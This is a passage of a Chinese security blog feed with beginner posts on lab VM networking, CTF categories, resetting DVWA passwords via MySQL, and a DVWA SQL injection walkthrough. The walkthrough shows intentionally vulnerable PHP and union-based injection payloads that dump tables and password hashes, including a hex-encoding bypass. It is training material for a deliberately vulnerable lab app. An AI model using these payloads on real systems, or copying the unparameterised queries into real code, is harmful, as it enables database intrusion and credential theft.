    <content type="html"><![CDATA[<p>配置nat 实现主机互通</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参加了拼客学院的第十期五天速成白帽子培训课，然后把一些常见的知识分享给大家</p><h2 id="安装靶机"><a href="#安装靶机" class="headerlink" title="安装靶机"></a>安装靶机</h2><p>下载的话网上都有直接去下就好了。</p><p>安装比较简单，这里推荐安装过程</p><p><a href="https://jingyan.baidu.com/article/b24f6c821cb98d86bfe5da83.html" target="_blank" rel="noopener">Winxp安装教程</a></p><p><a href="https://jingyan.baidu.com/article/9989c746d4f914f648ecfe2f.html" target="_blank" rel="noopener">Win2003安装教程</a></p><h1 id="配置NAT-实现互通"><a href="#配置NAT-实现互通" class="headerlink" title="配置NAT 实现互通"></a>配置NAT 实现互通</h1><p>配置nat过程都一样，所以这里只演示一种方式<br>以<code>winxp</code>为例  </p><ul><li><p>打开虚拟机，选择以vmmware形式打开<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20190710230814.png" alt></p></li><li><p>配置网卡为NAT模式<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231547.png" alt></p></li><li><p>打开cmd 输入ipconfig 即可查看配置<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231222.png" alt><br>3 ping win2003主机，查看是否连通</p></li><li><p>ping 网络中的某个网站，测试是否连通<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231326.png" alt></p></li></ul><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><p>如果你得vmnet8 没有配置正确是不能访问网络的<br>附上我的配置，如果有错误可以照着我的改</p><ul><li>虚拟网络适配器<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232159.png" alt></li><li>NAT 配置<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232249.png" alt></li><li>网络适配器的配置<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232403.png" alt></li></ul><hr><p>希望能给刚入门的小伙伴一点启发</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;配置nat 实现主机互通&lt;/p&gt;
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://yoursite.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="NAT" scheme="http://yoursite.com/tags/NAT/"/>
    
  </entry>
  
  <entry>
    <title>CTF介绍</title>
    <link href="http://yoursite.com/2019/10/04/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/CTF%E4%BB%8B%E7%BB%8D/"/>
    <id>http://yoursite.com/2019/10/04/实用技巧/CTF介绍/</id>
    <published>2019-10-04T03:14:02.000Z</published>
    <updated>2019-10-04T05:43:48.519Z</updated>
    
    <content type="html"><![CDATA[<p>刚开始接触CTF,对于misc，reverse等等都傻傻分不清，所以专门去查了下这些名词，给没有接触CTF的童鞋一点入门基础.</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚开始接触CTF,对于misc，reverse等等都傻傻分不清，所以专门去查了下这些名词，给没有接触CTF的童鞋一点入门基础。如果有不对的地方，欢迎大佬指点。</p><h1 id="CTF是什么"><a href="#CTF是什么" class="headerlink" title="CTF是什么"></a>CTF是什么</h1><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。<br>CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。<br>发展至今，已经成为全球范围网络安全圈流行的竞赛形式。<br>附上参考链接：<a href="https://baike.baidu.com/item/ctf/9548546?fr=aladdin" target="_blank" rel="noopener">CTF</a></p><h1 id="CTF-介绍"><a href="#CTF-介绍" class="headerlink" title="CTF 介绍"></a>CTF 介绍</h1><h2 id="赛事介绍"><a href="#赛事介绍" class="headerlink" title="赛事介绍"></a>赛事介绍</h2><p>我们把CTF简称为夺旗赛，是因为出题的人把答案都放一个叫flag的文件下或者用flag{}形式展示给我们。一般是我们在某个站点或者某个文件下去寻找或分析得到的</p><h2 id="模式介绍"><a href="#模式介绍" class="headerlink" title="模式介绍"></a>模式介绍</h2><p>  一般分为三类：<code>解题模式</code>、<code>攻防模式</code>,<code>混合模式</code>  </p><ol><li><p>解题模式</p><blockquote><p>通过解决主办方出的题目得到相应的分数，从而获得排名。参赛有个人和团队之分。<br>赛题主要分为以下几个方向：CHOICE(比较少，适合初学者)、BASIC(这个也不多见，适合刚入门的童鞋)、WEB、REVERSE、PWN、MISC等<br>以上名词等下会有介绍</p></blockquote></li><li><p>攻防模式</p><blockquote><p>一般我们叫AWD,这个模式不仅看眼技术还考验手速，参赛队伍在网络空间中互相攻击和防守，挖掘漏洞并攻击对手来得分。并防御其他对手攻击自己。攻防很考验技术和应急。也考研团队的合作能力</p></blockquote></li><li><p>混合模式</p><blockquote><p>将上述的两个模式结合起来。就是两个都玩，最后用分数一较高下<br>一般更多的是国际赛的比赛方式</p></blockquote></li></ol><h2 id="题型介绍"><a href="#题型介绍" class="headerlink" title="题型介绍"></a>题型介绍</h2><p>没错，这就是我刚接触最头疼的了，我内个去，这是啥啊！ 这就给你介绍介绍</p><ol><li>CHOICE:选择题包含关于信息安全的各类知识点，难度系数偏低，适合刚接触信息安全的人士来全面的了解安全行业的情况</li><li>BASIC: 主要考察基础的计算机与网络安全知识，涉及信息发掘、搜索、嗅探、无线安全、正则表达式、SQL、脚本语言、汇编、C语言以及简单的破解、溢出等知识。旨在普及信息安全知识，引领信息安全爱好者入门</li><li>WEB: 考察脚本注入、欺骗和跨站等脚本攻击技术</li><li>REVERSE: 考察逆向破解的相关技术，要求有较高的汇编语言读写能力，以及对操作系统原理的认识</li><li>PWN: 考察软件漏洞挖掘、分析及利用技术，探索二进制代码背后的秘密，要求对漏洞有一定理解，掌握操作系统原理的相关知识(自我感觉最有难度的)</li><li>MOBILE: 考察移动终端安全相关知识</li><li>MISC: 即杂项，考察各种计算机系统与网络安全知识，涉及隐写术、流量分析、内核安全等信息安全的各个领域。</li><li>PPC:即编程类题目，题目涉及到编程算法</li><li>CRYPTO:即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。<blockquote><p>对AWD等不过多介绍，因为我好菜啊，还没玩过，不敢发言</p></blockquote></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看了这么多，大家应该知道ctf是什么了吧！那么开始起航吧，之后我会一步一脚印的更新。形成一个完整的体系。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚开始接触CTF,对于misc，reverse等等都傻傻分不清，所以专门去查了下这些名词，给没有接触CTF的童鞋一点入门基础.&lt;/p&gt;
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://yoursite.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>DVWA 查看默认密码</title>
    <link href="http://yoursite.com/2019/10/04/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/DVWA%20%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E5%B9%B6%E4%BF%AE%E6%94%B9/"/>
    <id>http://yoursite.com/2019/10/04/实用技巧/DVWA 如何查看登录密码并修改/</id>
    <published>2019-10-04T03:13:03.000Z</published>
    <updated>2019-10-04T03:13:52.085Z</updated>
    
    <content type="html"><![CDATA[<p>如何数据库查看dvwa的密码，跳过密码验证</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天登录dvwa的时候发现密码错误，尝试了我自己常设置的密码后都没有结果，就决定去数据库查看dvwa的密码。话不多说，直接开始操作</p><h2 id="dvwa默认密码"><a href="#dvwa默认密码" class="headerlink" title="dvwa默认密码"></a>dvwa默认密码</h2><p>如果小伙伴们只需要dvwa的默认密码去登录dvwa，这里给出dvwa的默认密码<br>|    用户名    |    密码    |<br>|————-|————|<br>|    admin    |    password    |<br>|    gordonb    |    abc123    |<br>|    1337    |    charley    |<br>|    pablo    |    letmein    |<br>|    smithy|    password    |</p><h2 id="获取dvwa的密码"><a href="#获取dvwa的密码" class="headerlink" title="获取dvwa的密码"></a>获取dvwa的密码</h2><ol><li><p>登录靶机，定位到dvwa的当前目录下，我的位置是<code>/var/www/dvwa</code>，这里看自己的dvwa目录在哪。<br><img src="https://img-blog.csdnimg.cn/201904301206138.png" alt="dvwa目录位置"></p></li><li><p>查看dvwa的登录文件<code>login.php</code>，查看相关信息<br> 查看代码，发现密码是md5加密保存的，并且存放在数据库的users表下。<img src="https://img-blog.csdnimg.cn/20190430120820998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="dvwa的login.php文件"></p></li><li><p>查看配置文件中关于数据库的相关信息，文件位于：<code>/var/www/dvwa/config/config.inc.php</code></p><p>  <img src="https://img-blog.csdnimg.cn/20190430124811146.png" alt="配置文件位置"><br>  查看配置文件,发现DBMS是<code>mysql</code>，dvwa的数据库是<code>dvwa</code>,数据库的登录用户名是<code>root</code>,密码是<code>root</code>.<br><img src="https://img-blog.csdnimg.cn/20190430125042833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="配置文件"></p><ol start="4"><li><p>登录数据库查看密码</p><p>命令：mysql -u root -p<br>  输入密码root,连接到数据库<br><img src="https://img-blog.csdnimg.cn/20190430130748132.png" alt="mysql登录"></p><p>根据刚才的信息，我们知道数据库是dvwa，跳转到dvwa的数据库下，<br><img src="https://img-blog.csdnimg.cn/20190430130852961.png" alt="在这里插入图片描述"></p><p>查找表，发现存在user表，我们查看表的信息<br><img src="https://img-blog.csdnimg.cn/20190430130934281.png" alt="在这里插入图片描述"></p><p>查看users表，发现存在4个账户<br><img src="https://img-blog.csdnimg.cn/20190430131002233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ol></li><li><p>破解密码<br>  将值放到somd5解密，发现居然是空密码，无语了。<br><img src="https://img-blog.csdnimg.cn/20190430131131482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>修改密码<br> 如果md5解密不出来，那么我们就需要去修改密码了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">"password"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">md5值:<span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol><p>&ensp;&ensp;&ensp;&ensp;&ensp;修改admin的密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">set</span> <span class="keyword">password</span>=” <span class="number">5</span>f4dcc3b5aa765d61d8327deb882cf99” <span class="keyword">where</span> user_id=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><ol start="7"><li>登录dvwa<br>使用修改后的密码登录dvwa，发现登录成功。然后你就可以开始你的靶机学习之路了。</li></ol><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>希望可以帮到需要的各位，学安全不易，一步一脚印，多练习，总会有收获。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如何数据库查看dvwa的密码，跳过密码验证&lt;/p&gt;
    
    </summary>
    
    
      <category term="实用技巧" scheme="http://yoursite.com/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="DVWA" scheme="http://yoursite.com/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA 之SQL Injection</title>
    <link href="http://yoursite.com/2019/10/04/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/DVWA%20%E4%B9%8BSQL%20Injection/"/>
    <id>http://yoursite.com/2019/10/04/web安全/sql注入/DVWA 之SQL Injection/</id>
    <published>2019-10-04T03:12:17.000Z</published>
    <updated>2019-10-04T05:36:34.213Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文属于学习贴，我自己在学习的时候总结的，如有错误，请大家及时指出</p><blockquote><p>dvwa v1.0.7</p></blockquote><h2 id="何为SQL-injection"><a href="#何为SQL-injection" class="headerlink" title="何为SQL injection"></a>何为SQL injection</h2><p><a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289?fr=aladdin" target="_blank" rel="noopener">SQL injection</a> 即SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><h2 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h2><p>虽然sqlmap好用，但还是要掌握一些手工注入的思路。下面我们了解一下非盲注的步骤</p><blockquote><p>步骤来自FreeBuf.COM的lonehand</p></blockquote><ol><li>判断是否存在注入，判断注入的类型是字符型还是数字型（因为判断注入主要是用这两种来判断的）</li><li>猜解SQL查询语句的字段数</li><li>确定显示的字段顺序</li><li>获取数据库</li><li>获取数据库的表</li><li>获取表中的字段名</li><li>拿到想要的数据</li></ol><h1 id="DVWA-sql注入进行学习"><a href="#DVWA-sql注入进行学习" class="headerlink" title="DVWA sql注入进行学习"></a>DVWA sql注入进行学习</h1><h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获取输入</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">   <span class="comment">//执行sql命令</span></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">   <span class="comment">//返回结果</span></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;<span class="comment">//结果存在</span></span><br><span class="line"><span class="comment">//将得到的结果保存在变量中</span></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line">        <span class="comment">//输出到界面</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。  </p><blockquote><p>可以发现，没有任何的过滤和检查，可以直接构造sql 注入的命令。</p></blockquote><h2 id="Low-漏洞利用"><a href="#Low-漏洞利用" class="headerlink" title="Low 漏洞利用"></a>Low 漏洞利用</h2><ol><li>判断是否存在注入，判断注入的类型是字符型还是数字型<br>先输入一些内容查看结果<br><img src="https://img-blog.csdnimg.cn/20190502225219381.png" alt="在这里插入图片描述"><br>测试是否存在注入<br>输入命令<code>1 and 1=1</code>,返回了正确的值。<br><img src="https://img-blog.csdnimg.cn/20190502225332605.png" alt="在这里插入图片描述"><br>输入命令 <code>1 and 1=2</code>,返回了正确的值。后台数据库没有处理我们输入的值，可能不存在数字型注入<br><img src="https://img-blog.csdnimg.cn/20190502225422926.png" alt="在这里插入图片描述"><br>输入命令<code>1&#39;and &#39;1&#39; = &#39;2</code> 没有返回值，可能存在注入。<br><img src="https://img-blog.csdnimg.cn/20190502225441636.png" alt="在这里插入图片描述"><br>输入命令<code>1’ or ‘1’ =’1</code> 查询成功。 不正常的结果返回，存在字符型注入<br><img src="https://img-blog.csdnimg.cn/20190502225511808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>猜解SQL查询语句的字段数<br>使用order by 数字 从1依次递增去执行，发现命令错误时，则可以推出字段值<br>我们知道<code>1&#39; or 1=1</code> 执行时会报错的，而我们需要在字段超出的时候在报错，所以先构造一个会报错的命令：例如 <code>1&#39; and 1=1</code>，这是一个会报错的命令.<br><img src="https://img-blog.csdnimg.cn/20190502225625703.png" alt="在这里插入图片描述"><br>我们添加order by 到命令后,并注释,确保正确执行。<br><code>1&#39; and 1=1 order by 1 #</code><br><img src="https://img-blog.csdnimg.cn/20190502225659845.png" alt="在这里插入图片描述"><br>输入<code>1&#39; and 1=1 order by 2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502225804750.png" alt="在这里插入图片描述"><br>输入<code>1&#39; and 1=1 order by 3 #``  说明执行的sql查询语句只有两个字段，  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225822295.png)  也可以使用union select 来查询字段，这样也可以获取字段输入</code>1’ and 1=1 union select 1,2 #<code>![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502230020712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)输入</code>1’ and 1=1 union select 1,2,3 #`<br><img src="https://img-blog.csdnimg.cn/20190502230132800.png" alt="在这里插入图片描述">  </li><li>确定显示的字段顺序<br>如果使用order by 来获取的字段值，我们需要使用 <code>union select 1,2 #</code> 来获取字段的顺序，使用<code>union select</code> 就不需要这一步。<br>输入命令： <code>1’ union select 1,2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502230756923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>获取数据库<br>输入命令：<code>1’ union select 1,database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502230846528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获取到数据库：<code>dvwa</code></li><li>获取数据库中的表<br>输入命令：<code>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502230940249.png" alt="在这里插入图片描述"><br>数据库中dvwa 有两个表，guestbook和users</li><li>获取表中的字段名<br>输入命令：<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39; #</code><br><img src="https://img-blog.csdnimg.cn/20190502231031420.png" alt="在这里插入图片描述"><br>users有5个段,<code>user_id,first_name,last_name,user,password,avatar</code></li><li>拿到想要的数据<br>输入命令：<code>1’ union select group_concat(user_id,first_name,last_name),group_concat(passwrod) from users #</code><br><img src="https://img-blog.csdnimg.cn/2019050223112869.png" alt="在这里插入图片描述"><br>这样就可以得到users表中的用户<code>user_id,first_name,last_name,password</code></li></ol><h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id"</span>;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>过滤函数</strong>：<br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string()</a> 函数转义 SQL 语句中使用的字符串中的特殊字符。\x00 、\n、 \r、&#39;、、”、\x1a，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br><strong>相关函数</strong>：<br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。  </p></blockquote><h2 id="Medium-漏洞利用"><a href="#Medium-漏洞利用" class="headerlink" title="Medium 漏洞利用"></a>Medium 漏洞利用</h2><p>听说在有版本在前端成为下拉框，这里抓包修改包，绕过就好</p><ol><li><p>判断是否存在注入，判断注入的类型是字符型还是数字型（因为判断注入主要是用这两种来判断的）<br>输入命令：<code>1’ or ‘1’ =’1 #</code> 不是字符型注入，报错<br><img src="https://img-blog.csdnimg.cn/20190502231653246.png" alt="在这里插入图片描述"><br>输入命令：<code>1 or 1=1 #</code><br><img src="https://img-blog.csdnimg.cn/20190502231912434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>存在数字型注入，（刚刚的过滤函数过滤了常见的字符，但是由于是数字型注入，就没有作用了，这里不会使用到引号）  </p></li><li><p>猜解SQL查询语句的字段数<br>接下来就和low级别区别不大了，我们跳过基础讲解<br>输入命令：<code>1 or 1=1 order by 2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502232024370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入命令：<code>输入 1 or 1=1 order by 3 #</code><br><img src="https://img-blog.csdnimg.cn/20190502232110632.png" alt="在这里插入图片描述">  </p></li><li><p>确定显示的字段顺序<br>输入命令：<code>1 union select 1,2 #</code><br><img src="https://img-blog.csdnimg.cn/2019050223215556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>获取数据库<br>输入命令：<code>1 union select 1,database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502232304932.png" alt="在这里插入图片描述"><br>数据库是dvwa</p></li><li><p>获取数据库的表<br>输入命令：<code>1 union select 1,group_concat(table_name) form information_schema.tables where table_schema = database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502232356592.png" alt="在这里插入图片描述"><br>table 有 <code>guestbook</code> 和 <code>users</code></p></li><li><p>获取表中的字段名<br>输入命令：<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name = ‘users’ #</code><br>查询失败，引号被转义了<br><img src="https://img-blog.csdnimg.cn/20190502232540616.png" alt="在这里插入图片描述"><br>这里我们采用十六进制进行绕过,users 改为 0×7573657273 成功绕过<br><img src="https://img-blog.csdnimg.cn/20190502232612759.png" alt="在这里插入图片描述"><br>users表中有：user_id,first_name,last_name,password,avatar</p></li><li><p>拿到想要的数据<br>输入命令：<code>1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users</code><br><img src="https://img-blog.csdnimg.cn/20190502232648220.png" alt="在这里插入图片描述"><br>获取到users表中的所有用户的信息</p></li></ol><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span 